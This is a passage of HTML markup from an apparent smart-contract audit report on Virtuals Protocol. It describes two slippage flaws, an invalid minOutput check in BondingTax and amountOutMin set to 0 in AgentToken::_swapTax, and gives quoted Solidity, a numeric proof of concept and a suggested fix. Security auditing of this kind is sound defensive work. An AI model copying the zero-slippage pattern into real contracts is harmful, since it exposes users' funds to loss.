href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L143\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L143\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"impact-6\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eInvalid slippage check allows any swap-out result, causing the treasury to lose the value of collected tax. Note that, even though the base chain has a low risk of front-running attack, the loss due to slippage happens naturally during normal trading activities.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eSlippage needs to be based on an expected price. Given \u003ccode\u003eswapForAsset\u003c/code\u003e is only intended to be invoked by BondingRouter, consider implementing a trusted on-chain oracle price reporting and basing the slippage calculation on the on-chain price.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-9\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eSuppose 10000 virtual = 1 WBTC, due to a previous trading, price drops to 10000 virtual = 0.0833 WBTC. 1% slippage based on expected price: 0.099 WBTC.\u003c/p\u003e\n\u003cp\u003eIn \u003ccode\u003eswapForAsset\u003c/code\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eBondingTax calculates \u003ccode\u003eminOutput\u003c/code\u003e with 1% slippage\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eminOutput = 0.0833 WBTC * (10000 - 100) / 10000 = 0.0825 WBTC\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eBondingTax executes swap with these parameters:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003erouter.swapExactTokensForTokens(\u003c/code\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"53\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e1000 VIRTUAL,      // amountIn\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e0.0825 WBTC,       // minOutput (1% less than minOutput)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e[VIRTUAL, WBTC],   // path\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003etreasury,          // recipient\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eblock.timestamp + 300  // deadline\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe swap executes at the worse price:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTreasury receives approximately 0.0833 WBTC \u003ccode\u003e\u0026#x3C;\u003c/code\u003e 0.099 WBTC.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003ccode\u003eswapForAsset\u003c/code\u003e accepts unbounded slippage.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-07-amountoutmin-passed-in-as-0-in-agenttoken_swaptax-leads-to-loss-of-funds-due-to-slippage\" style=\"position:relative;\"\u003e\u003ca href=\"#m-07-amountoutmin-passed-in-as-0-in-agenttoken_swaptax-leads-to-loss-of-funds-due-to-slippage\" aria-label=\"m 07 amountoutmin passed in as 0 in agenttoken_swaptax leads to loss of funds due to slippage permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-15\"\u003e[M-07] \u003ccode\u003eamountOutMin\u003c/code\u003e passed in as 0 in \u003ccode\u003eAgentToken::_swapTax\u003c/code\u003e leads to loss of funds due to slippage\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-623\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-733\"\u003e0x60scs\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-244\"\u003eadam-idarrha\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-247\"\u003eanchabadze\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-574\"\u003ebytesguard\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-198\"\u003eclassic-k\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-757\"\u003eDanielTan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-3\"\u003edebo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-9\"\u003egmh5225\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-396\"\u003egregom\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-801\"\u003eharsh123\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-240\"\u003eodessos42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-796\"\u003eOlugbenga\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-681\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-441\"\u003eslowbugmayor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-776\"\u003eTopmark\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-722\"\u003eunique\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L793\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L793\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-4\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-4\" aria-label=\"finding description 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L784\"\u003e\u003ccode\u003eAgentToken::_swapTax\u003c/code\u003e\u003c/a\u003e is called via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L731\"\u003e\u003ccode\u003eAgentToken::_autoSwap\u003c/code\u003e\u003c/a\u003e whenever a \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L609\"\u003e\u003ccode\u003eAgentToken::_transfer\u003c/code\u003e\u003c/a\u003e call takes place.\u003c/p\u003e\n\u003cp\u003eOn further inspection, it can be observed that \u003ccode\u003e_swapTax\u003c/code\u003e internally calls uniswap router’s \u003ccode\u003eswapExactTokensForTokensSupportingFeeOnTransferTokens\u003c/code\u003e function where \u003ccode\u003eamountOutMin\u003c/code\u003e is passed as 0.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_swapTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapBalance_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtractBalance_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Wrap external calls in try / catch to handle errors\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokensSupportingFeeOnTransferTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapBalance_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,                                                                  \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// amountOutMin is passed as 0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprojectTaxRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e600\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e           \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Don\u0026#39;t allow a failed external call (in this case to uniswap) to stop a transfer.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Emit that this has occurred and continue.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eExternalCallError\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e5\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis can lead to unexpectedly high slippage, leading to loss of funds for \u003ccode\u003eprojectTaxRecipient\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"impact-7\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eLoss of funds for the \u003ccode\u003eprojectTaxRecipient\u003c/code\u003e due to high slippage.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is recommended to calculate \u003ccode\u003eamountOutMin\u003c/code\u003e instead of passing 0:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"55\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction swapTax(uint256 swapBalance_, uint256 contractBalance_) internal {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    address[] memory path = new address[](2);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    path[0] = address(this);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    path[1] = pairToken;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+    // Calculate the minimum amount out with slippage tolerance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+    uint256 amountOutMin = calculateMinimumAmountOut(swapBalance_, path);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // Wrap external calls in try / catch to handle errors\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    try\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            swapBalance_,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-            0,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+            amountOutMin,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            path,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            projectTaxRecipient,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            block.timestamp + 600\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // We will not have swapped all tax tokens IF the amount was greater than the max auto swap.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // We therefore cannot just set the pending swap counters to 0. Instead, in this scenario,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // we must reduce them in proportion to the swap amount vs the remaining balance + 